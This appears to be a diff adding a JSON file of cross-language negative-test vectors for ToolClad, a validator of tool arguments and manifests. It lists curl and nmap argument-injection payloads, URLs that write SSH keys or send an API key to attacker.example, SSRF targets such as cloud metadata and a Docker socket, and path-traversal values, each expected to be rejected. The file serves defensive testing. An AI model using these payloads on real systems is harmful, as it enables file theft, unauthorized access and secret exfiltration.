@@ -1,0 +1,682 @@
+{
+  "_comment": "Cross-language negative-test vectors for argument validation and manifest loading. Every ToolClad implementation MUST produce the stated verdict for every vector. Vectors are deterministic: none depends on live DNS, a filesystem path, or an environment variable.",
+  "version": "1.0.0",
+  "arg_vectors": [
+    {
+      "id": "string-quote-breakout-curl-header",
+      "arg": { "type": "string" },
+      "value": "' -d @/etc/passwd",
+      "expect": "reject",
+      "note": "TC-1: single quote closes a template-level quote and appends curl options"
+    },
+    {
+      "id": "string-quote-breakout-header-pair",
+      "arg": { "type": "string" },
+      "value": "X: y' -d @/etc/passwd -H 'Z: w",
+      "expect": "reject",
+      "note": "TC-1: full curl_fetch headers breakout payload"
+    },
+    {
+      "id": "string-space-only",
+      "arg": { "type": "string" },
+      "value": "two words",
+      "expect": "reject",
+      "note": "TC-1: an unquoted space becomes a second argv entry under the legacy splitter"
+    },
+    {
+      "id": "string-tab",
+      "arg": { "type": "string" },
+      "value": "a\tb",
+      "expect": "reject",
+      "note": "TC-1: tab is whitespace too"
+    },
+    {
+      "id": "string-double-quote",
+      "arg": { "type": "string" },
+      "value": "say \"hi\"",
+      "expect": "reject",
+      "note": "TC-1: double quote plus whitespace"
+    },
+    {
+      "id": "string-backslash",
+      "arg": { "type": "string" },
+      "value": "a\\b",
+      "expect": "reject",
+      "note": "TC-1: backslash escapes in the legacy tokenizer"
+    },
+    {
+      "id": "string-allow-whitespace-still-rejects-quote",
+      "arg": { "type": "string", "allow_whitespace": true },
+      "value": "two 'words",
+      "expect": "reject",
+      "note": "allow_whitespace never permits quotes"
+    },
+    {
+      "id": "string-nmap-input-list",
+      "arg": { "type": "string" },
+      "value": "-iL /etc/passwd",
+      "expect": "reject",
+      "note": "TC-2: nmap reads an arbitrary file and leaks it through stderr"
+    },
+    {
+      "id": "string-nmap-script-path",
+      "arg": { "type": "string" },
+      "value": "--script=/tmp/evil.nse",
+      "expect": "reject",
+      "note": "TC-2: nmap NSE Lua execution"
+    },
+    {
+      "id": "string-nmap-script-args",
+      "arg": { "type": "string" },
+      "value": "--script http-fetch --script-args http-fetch.destination=/tmp/d",
+      "expect": "reject",
+      "note": "TC-2: stage one of the nmap NSE drop"
+    },
+    {
+      "id": "string-long-option-equals",
+      "arg": { "type": "string" },
+      "value": "--output=/etc/cron.d/x",
+      "expect": "reject",
+      "note": "TC-3: leading dash, no whitespace needed"
+    },
+    {
+      "id": "string-short-option-attached",
+      "arg": { "type": "string" },
+      "value": "-f/etc/shadow",
+      "expect": "reject",
+      "note": "TC-3: single argv element that is still a valid option"
+    },
+    {
+      "id": "string-plus-option",
+      "arg": { "type": "string" },
+      "value": "+short",
+      "expect": "reject",
+      "note": "TC-3: dig-style plus options"
+    },
+    {
+      "id": "string-bare-double-dash",
+      "arg": { "type": "string" },
+      "value": "--",
+      "expect": "reject",
+      "note": "TC-3: a user-supplied end-of-options marker"
+    },
+    {
+      "id": "string-leading-dash-opt-in",
+      "arg": { "type": "string", "allow_leading_dash": true },
+      "value": "-v",
+      "expect": "accept",
+      "note": "TC-3: explicit per-arg opt-in"
+    },
+    {
+      "id": "string-escape-sequence",
+      "arg": { "type": "string" },
+      "value": "\u001b]0;title\u0007",
+      "expect": "reject",
+      "note": "control characters (OSC terminal escape)"
+    },
+    {
+      "id": "string-nul-byte",
+      "arg": { "type": "string" },
+      "value": "abc\u0000def",
+      "expect": "reject",
+      "note": "NUL must be rejected by the validator, not only by execve"
+    },
+    {
+      "id": "string-newline",
+      "arg": { "type": "string" },
+      "value": "a\nb",
+      "expect": "reject",
+      "note": "newline injection"
+    },
+    {
+      "id": "string-metacharacter-semicolon",
+      "arg": { "type": "string" },
+      "value": "a;b",
+      "expect": "reject",
+      "note": "legacy shell-metacharacter blocklist, kept as defense in depth"
+    },
+    {
+      "id": "string-plain-accept",
+      "arg": { "type": "string" },
+      "value": "hello-world",
+      "expect": "accept",
+      "note": "positive control"
+    },
+    {
+      "id": "integer-negative-default-deny",
+      "arg": { "type": "integer" },
+      "value": "-1",
+      "expect": "reject",
+      "note": "TC-3: a negative integer is a valid option to most parsers"
+    },
+    {
+      "id": "integer-negative-opt-in",
+      "arg": { "type": "integer", "allow_leading_dash": true },
+      "value": "-1",
+      "expect": "accept",
+      "note": "TC-3: explicit opt-in"
+    },
+    {
+      "id": "integer-empty-string",
+      "arg": { "type": "integer" },
+      "value": "",
+      "expect": "reject",
+      "note": "TC-20: JS Number(\"\") was 0"
+    },
+    {
+      "id": "integer-hex",
+      "arg": { "type": "integer" },
+      "value": "0x10",
+      "expect": "reject",
+      "note": "TC-20: JS Number(\"0x10\") was 16"
+    },
+    {
+      "id": "integer-underscores",
+      "arg": { "type": "integer" },
+      "value": "1_000",
+      "expect": "reject",
+      "note": "TC-20: Python int() accepts underscores"
+    },
+    {
+      "id": "integer-surrounding-whitespace",
+      "arg": { "type": "integer" },
+      "value": " 7 ",
+      "expect": "reject",
+      "note": "TC-20: Python int() strips whitespace"
+    },
+    {
+      "id": "integer-plain-accept",
+      "arg": { "type": "integer" },
+      "value": "42",
+      "expect": "accept",
+      "note": "positive control"
+    },
+    {
+      "id": "duration-trailing-newline",
+      "arg": { "type": "duration" },
+      "value": "5m\n",
+      "expect": "reject",
+      "note": "TC-20: Python $ matched before a trailing newline"
+    },
+    {
+      "id": "duration-underscores",
+      "arg": { "type": "duration" },
+      "value": "1_000",
+      "expect": "reject",
+      "note": "TC-20"
+    },
+    {
+      "id": "duration-padded",
+      "arg": { "type": "duration" },
+      "value": " 7 ",
+      "expect": "reject",
+      "note": "TC-20"
+    },
+    {
+      "id": "duration-accept",
+      "arg": { "type": "duration" },
+      "value": "1h30m",
+      "expect": "accept",
+      "note": "positive control"
+    },
+    {
+      "id": "url-space-option-injection",
+      "arg": { "type": "url" },
+      "value": "https://attacker.example/ -o /root/.ssh/authorized_keys",
+      "expect": "reject",
+      "note": "TC-1: the confirmed curl_fetch url payload"
+    },
+    {
+      "id": "url-space-write-tmp",
+      "arg": { "type": "url" },
+      "value": "https://attacker.example/ -o /tmp/pwned",
+      "expect": "reject",
+      "note": "TC-1: second confirmed url payload"
+    },
+    {
+      "id": "url-secret-smuggling",
+      "arg": { "type": "url" },
+      "value": "https://attacker.example/?k={_secret:api_key}",
+      "expect": "reject",
+      "note": "TC-7: JS expanded secrets after interpolation"
+    },
+    {
+      "id": "url-javascript-scheme",
+      "arg": { "type": "url" },
+      "value": "javascript:alert(1)",
+      "expect": "reject",
+      "note": "TC-6"
+    },
+    {
+      "id": "url-file-scheme",
+      "arg": { "type": "url" },
+      "value": "file:///etc/passwd",
+      "expect": "reject",
+      "note": "TC-6"
+    },
+    {
+      "id": "url-data-scheme",
+      "arg": { "type": "url" },
+      "value": "data:text/html,<script>1</script>",
+      "expect": "reject",
+      "note": "TC-6"
+    },
+    {
+      "id": "url-gopher-redis",
+      "arg": { "type": "url" },
+      "value": "gopher://127.0.0.1:6379/_FLUSHALL",
+      "expect": "reject",
+      "note": "TC-6: Go and Python accepted any scheme when schemes was unset"
+    },
+    {
+      "id": "url-dict-scheme",
+      "arg": { "type": "url" },
+      "value": "dict://127.0.0.1:11211/stat",
+      "expect": "reject",
+      "note": "TC-6"
+    },
+    {
+      "id": "url-userinfo",
+      "arg": { "type": "url" },
+      "value": "http://user:pw@example.com/",
+      "expect": "reject",
+      "note": "TC-6: userinfo hides the real host from a human reviewer"
+    },
+    {
+      "id": "url-metacharacter",
+      "arg": { "type": "url" },
+      "value": "https://attacker.example/;id",
+      "expect": "reject",
+      "note": "TC-6: JS ran no metacharacter check at all"
+    },
+    {
+      "id": "url-scheme-not-in-list",
+      "arg": { "type": "url", "schemes": ["https"] },
+      "value": "http://example.com/",
+      "expect": "reject",
+      "note": "TC-6: Rust ignored the schemes list"
+    },
+    {
+      "id": "url-imds-always-blocked",
+      "arg": { "type": "url" },
+      "value": "http://169.254.169.254/latest/meta-data/",
+      "expect": "reject",
+      "note": "TC-4: link-local is blocked with or without block_internal"
+    },
+    {
+      "id": "url-docker-socket-block-internal",
+      "arg": { "type": "url", "block_internal": true },
+      "value": "http://127.0.0.1:2375/containers/json",
+      "expect": "reject",
+      "note": "TC-4"
+    },
+    {
+      "id": "url-ipv6-loopback-block-internal",
+      "arg": { "type": "url", "block_internal": true },
+      "value": "http://[::1]:8080/",
+      "expect": "reject",
+      "note": "TC-6"
+    },
+    {
+      "id": "url-accept",
+      "arg": { "type": "url" },
+      "value": "https://example.com/path",
+      "expect": "accept",
+      "note": "positive control"
+    },
+    {
+      "id": "url-accept-public-ip-block-internal",
+      "arg": { "type": "url", "block_internal": true },
+      "value": "https://93.184.216.34/x",
+      "expect": "accept",
+      "note": "positive control: a public literal needs no DNS"
+    },
+    {
+      "id": "scope-localhost",
+      "arg": { "type": "scope_target" },
+      "value": "localhost",
+      "expect": "reject",
+      "note": "TC-5: the internal-name denylist applies unconditionally"
+    },
+    {
+      "id": "scope-localhost-suffix",
+      "arg": { "type": "scope_target" },
+      "value": "api.localhost",
+      "expect": "reject",
+      "note": "TC-5"
+    },
+    {
+      "id": "scope-mdns-local",
+      "arg": { "type": "scope_target" },
+      "value": "printer.local",
+      "expect": "reject",
+      "note": "TC-5"
+    },
+    {
+      "id": "scope-google-metadata-name",
+      "arg": { "type": "scope_target" },
+      "value": "metadata.google.internal",
+      "expect": "reject",
+      "note": "TC-5"
+    },
+    {
+      "id": "scope-embedded-imds-literal",
+      "arg": { "type": "scope_target" },
+      "value": "169.254.169.254.nip.io",
+      "expect": "reject",
+      "note": "TC-5: an IP literal embedded in a wildcard-DNS hostname"
+    },
+    {
+      "id": "scope-embedded-loopback-literal",
+      "arg": { "type": "scope_target", "block_internal": true },
+      "value": "127.0.0.1.nip.io",
+      "expect": "reject",
+      "note": "TC-5: the confirmed nip.io bypass"
+    },
+    {
+      "id": "scope-embedded-dashed-literal",
+      "arg": { "type": "scope_target", "block_internal": true },
+      "value": "10-0-0-1.nip.io",
+      "expect": "reject",
+      "note": "TC-5: dashed-quad wildcard DNS form"
+    },
+    {
+      "id": "scope-supernet-cidr-overlap",
+      "arg": { "type": "scope_target", "block_internal": true },
+      "value": "8.0.0.0/5",
+      "expect": "reject",
+      "note": "TC-5: contains all of 10/8 while its base address is public"
+    },
+    {
+      "id": "scope-private-cidr",
+      "arg": { "type": "scope_target", "block_internal": true },
+      "value": "10.0.0.0/24",
+      "expect": "reject",
+      "note": "TC-5"
+    },
+    {
+      "id": "scope-decimal-ip-literal",
+      "arg": { "type": "scope_target" },
+      "value": "2130706433",
+      "expect": "reject",
+      "note": "TC-20: a libc resolver expands this to 127.0.0.1"
+    },
+    {
+      "id": "scope-hex-ip-literal",
+      "arg": { "type": "scope_target" },
+      "value": "0x7f000001",
+      "expect": "reject",
+      "note": "TC-20"
+    },
+    {
+      "id": "scope-octal-ip-literal",
+      "arg": { "type": "scope_target" },
+      "value": "0177.0.0.1",
+      "expect": "reject",
+      "note": "TC-20"
+    },
+    {
+      "id": "scope-shorthand-ip-literal",
+      "arg": { "type": "scope_target" },
+      "value": "127.1",
+      "expect": "reject",
+      "note": "TC-20"
+    },
+    {
+      "id": "scope-trailing-dot",
+      "arg": { "type": "scope_target" },
+      "value": "example.com.",
+      "expect": "reject",
+      "note": "TC-20: Go and Python accepted a trailing dot"
+    },
+    {
+      "id": "scope-numeric-tld",
+      "arg": { "type": "scope_target" },
+      "value": "example.123",
+      "expect": "reject",
+      "note": "TC-20"
+    },
+    {
+      "id": "scope-overlong-host",
+      "arg": { "type": "scope_target" },
+      "value": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+      "expect": "reject",
+      "note": "254 octets, over the RFC 1035 limit"
+    },
+    {
+      "id": "scope-overlong-label",
+      "arg": { "type": "scope_target" },
+      "value": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.com",
+      "expect": "reject",
+      "note": "64-octet label, over the 63-octet limit"
+    },
+    {
+      "id": "scope-newline-injection",
+      "arg": { "type": "scope_target" },
+      "value": "example.com\nmalicious.com",
+      "expect": "reject",
+      "note": "from scope_vectors.json"
+    },
+    {
+      "id": "scope-punycode",
+      "arg": { "type": "scope_target" },
+      "value": "xn--example-9c.com",
+      "expect": "reject",
+      "note": "IDN homoglyph bypass"
+    },
+    {
+      "id": "scope-accept-hostname",
+      "arg": { "type": "scope_target" },
+      "value": "example.com",
+      "expect": "accept",
+      "note": "positive control"
+    },
+    {
+      "id": "scope-accept-cidr",
+      "arg": { "type": "scope_target" },
+      "value": "10.0.1.0/24",
+      "expect": "accept",
+      "note": "positive control: no block_internal, so private space is allowed"
+    },
+    {
+      "id": "scope-accept-public-ip-block-internal",
+      "arg": { "type": "scope_target", "block_internal": true },
+      "value": "93.184.216.34",
+      "expect": "accept",
+      "note": "positive control"
+    },
+    {
+      "id": "path-leading-dash",
+      "arg": { "type": "path" },
+      "value": "-rf",
+      "expect": "reject",
+      "note": "TC-3: confirmed accepted by Python and JS"
+    },
+    {
+      "id": "path-bare-dotdot-component",
+      "arg": { "type": "path" },
+      "value": "foo/..",
+      "expect": "reject",
+      "note": "TC-20: Rust and JS used a '../' substring test"
+    },
+    {
+      "id": "path-dotdot-only",
+      "arg": { "type": "path" },
+      "value": "..",
+      "expect": "reject",
+      "note": "TC-20"
+    },
+    {
+      "id": "path-absolute",
+      "arg": { "type": "path" },
+      "value": "/etc/shadow",
+      "expect": "reject",
+      "note": "absolute paths are blocked"
+    },
+    {
+      "id": "path-accept",
+      "arg": { "type": "path" },
+      "value": "config/settings.toml",
+      "expect": "accept",
+      "note": "positive control"
+    },
+    {
+      "id": "regex-match-leading-dash",
+      "arg": { "type": "regex_match", "pattern": ".*" },
+      "value": "-oN/etc/cron.d/x",
+      "expect": "reject",
+      "note": "TC-3: an unanchored .* pattern must not let an option through"
+    },
+    {
+      "id": "regex-match-unanchored-pattern",
+      "arg": { "type": "regex_match", "pattern": "[a-z]+" },
+      "value": "abc123",
+      "expect": "reject",
+      "note": "design issue 8: patterns are anchored, so this is a full-string match"
+    },
+    {
+      "id": "regex-match-accept",
+      "arg": { "type": "regex_match", "pattern": "[a-z]+" },
+      "value": "abc",
+      "expect": "accept",
+      "note": "positive control"
+    },
+    {
+      "id": "string-unanchored-pattern",
+      "arg": { "type": "string", "pattern": "[a-z]+" },
+      "value": "abc123",
+      "expect": "reject",
+      "note": "design issue 8"
+    },
+    {
+      "id": "msf-options-leading-dash",
+      "arg": { "type": "msf_options" },
+      "value": "-oN /tmp/x",
+      "expect": "reject",
+      "note": "TC-3"
+    },
+    {
+      "id": "msf-options-quote",
+      "arg": { "type": "msf_options" },
+      "value": "RHOSTS 10.0.0.1' -x",
+      "expect": "reject",
+      "note": "TC-1: quotes are rejected even where whitespace is the grammar"
+    },
+    {
+      "id": "msf-options-accept",
+      "arg": { "type": "msf_options" },
+      "value": "RHOSTS 10.0.1.1;RPORT 445",
+      "expect": "accept",
+      "note": "positive control: space is this type's KEY VALUE separator"
+    },
+    {
+      "id": "enum-nul",
+      "arg": { "type": "enum", "allowed": ["ping", "syn"] },
+      "value": "ping\u0000",
+      "expect": "reject",
+      "note": "NUL rejection applies to every type"
+    },
+    {
+      "id": "enum-accept",
+      "arg": { "type": "enum", "allowed": ["ping", "syn"] },
+      "value": "ping",
+      "expect": "accept",
+      "note": "positive control"
+    },
+    {
+      "id": "cidr-ipv6-accept",
+      "arg": { "type": "cidr" },
+      "value": "2001:db8::/32",
+      "expect": "accept",
+      "note": "TC-20: IPv6 CIDR is accepted in all four runtimes"
+    },
+    {
+      "id": "port-zero",
+      "arg": { "type": "port" },
+      "value": "0",
+      "expect": "reject",
+      "note": "ports are 1-65535"
+    },
+    {
+      "id": "port-accept",
+      "arg": { "type": "port" },
+      "value": "443",
+      "expect": "accept",
+      "note": "positive control"
+    }
+  ],
+  "manifest_vectors": [
+    {
+      "id": "template-placeholder-inside-quotes",
+      "manifest": "[tool]\nname = \"t\"\nversion = \"1.0.0\"\nbinary = \"echo\"\ndescription = \"x\"\n\n[args.headers]\nposition = 1\nrequired = false\ntype = \"string\"\ndefault = \"\"\ndescription = \"h\"\n\n[command]\ntemplate = \"echo -H '{headers}'\"\n\n[output]\nformat = \"text\"\n",
+      "expect": "reject",
+      "note": "TC-1: a placeholder inside quotes cannot be tokenized safely"
+    },
+    {
+      "id": "unknown-tool-key-typo",
+      "manifest": "[tool]\nname = \"t\"\nversion = \"1.0.0\"\nbinary = \"echo\"\ndescription = \"x\"\ntiemout_seconds = 5\n\n[command]\nexec = [\"echo\", \"hi\"]\n\n[output]\nformat = \"text\"\n",
+      "expect": "reject",
+      "note": "TC-13: a misspelled key silently fell back to the default"
+    },
+    {
+      "id": "unknown-arg-key",
+      "manifest": "[tool]\nname = \"t\"\nversion = \"1.0.0\"\nbinary = \"echo\"\ndescription = \"x\"\n\n[args.target]\nposition = 1\nrequired = true\ntype = \"string\"\nblock_internal_typo = true\ndescription = \"t\"\n\n[command]\nexec = [\"echo\", \"{target}\"]\n\n[output]\nformat = \"text\"\n",
+      "expect": "reject",
+      "note": "TC-13"
+    },
+    {
+      "id": "egress-binary-without-block-internal",
+      "manifest": "[tool]\nname = \"fetch\"\nversion = \"1.0.0\"\nbinary = \"curl\"\ndescription = \"x\"\n\n[args.url]\nposition = 1\nrequired = true\ntype = \"url\"\ndescription = \"u\"\n\n[command]\nexec = [\"curl\", \"{url}\"]\n\n[output]\nformat = \"text\"\n",
+      "expect": "reject",
+      "note": "TC-4 / TC-15: an egress tool must default-deny internal targets"
+    },
+    {
+      "id": "zero-timeout",
+      "manifest": "[tool]\nname = \"t\"\nversion = \"1.0.0\"\nbinary = \"echo\"\ndescription = \"x\"\ntimeout_seconds = 0\n\n[command]\nexec = [\"echo\", \"hi\"]\n\n[output]\nformat = \"text\"\n",
+      "expect": "reject",
+      "note": "TC-11: zero disabled the timeout entirely in Rust"
+    },
+    {
+      "id": "custom-output-parser",
+      "manifest": "[tool]\nname = \"t\"\nversion = \"1.0.0\"\nbinary = \"echo\"\ndescription = \"x\"\n\n[command]\nexec = [\"echo\", \"hi\"]\n\n[output]\nformat = \"json\"\nparser = \"scripts/parse.py\"\n",
+      "expect": "reject",
+      "note": "TC-14: custom parsers were silently ignored"
+    },
+    {
+      "id": "shell-as-binary",
+      "manifest": "[tool]\nname = \"t\"\nversion = \"1.0.0\"\nbinary = \"bash\"\ndescription = \"x\"\n\n[args.cmd]\nposition = 1\nrequired = true\ntype = \"string\"\ndescription = \"c\"\n\n[command]\nexec = [\"bash\", \"-c\", \"{cmd}\"]\n\n[output]\nformat = \"text\"\n",
+      "expect": "reject",
+      "note": "TC-21: an interpreter as argv[0] needs an explicit opt-in"
+    },
+    {
+      "id": "binary-basename-mismatch",
+      "manifest": "[tool]\nname = \"t\"\nversion = \"1.0.0\"\nbinary = \"echo\"\ndescription = \"x\"\n\n[command]\nexec = [\"cat\", \"/etc/passwd\"]\n\n[output]\nformat = \"text\"\n",
+      "expect": "reject",
+      "note": "TC-8: argv[0] must match the declared binary"
+    },
+    {
+      "id": "bad-end-of-options",
+      "manifest": "[tool]\nname = \"t\"\nversion = \"1.0.0\"\nbinary = \"echo\"\ndescription = \"x\"\n\n[command]\nexec = [\"echo\", \"hi\"]\nend_of_options = \"++\"\n\n[output]\nformat = \"text\"\n",
+      "expect": "reject",
+      "note": "only the literal \"--\" is accepted"
+    },
+    {
+      "id": "unresolved-placeholder",
+      "manifest": "[tool]\nname = \"t\"\nversion = \"1.0.0\"\nbinary = \"echo\"\ndescription = \"x\"\n\n[command]\nexec = [\"echo\", \"{nope}\"]\n\n[output]\nformat = \"text\"\n",
+      "expect": "reject",
+      "note": "TC-23: unresolved placeholders used to reach argv literally"
+    },
+    {
+      "id": "minimal-valid-exec",
+      "manifest": "[tool]\nname = \"t\"\nversion = \"1.0.0\"\nbinary = \"echo\"\ndescription = \"x\"\n\n[args.msg]\nposition = 1\nrequired = true\ntype = \"string\"\ndescription = \"m\"\n\n[command]\nexec = [\"echo\", \"{msg}\"]\n\n[output]\nformat = \"text\"\n",
+      "expect": "accept",
+      "note": "positive control"
+    },
+    {
+      "id": "minimal-valid-template",
+      "manifest": "[tool]\nname = \"t\"\nversion = \"1.0.0\"\nbinary = \"echo\"\ndescription = \"x\"\n\n[args.msg]\nposition = 1\nrequired = true\ntype = \"string\"\ndescription = \"m\"\n\n[command]\ntemplate = \"echo {msg}\"\n\n[output]\nformat = \"text\"\n",
+      "expect": "accept",
+      "note": "positive control: the legacy form still loads, with a deprecation warning"
+    }
+  ]
+}
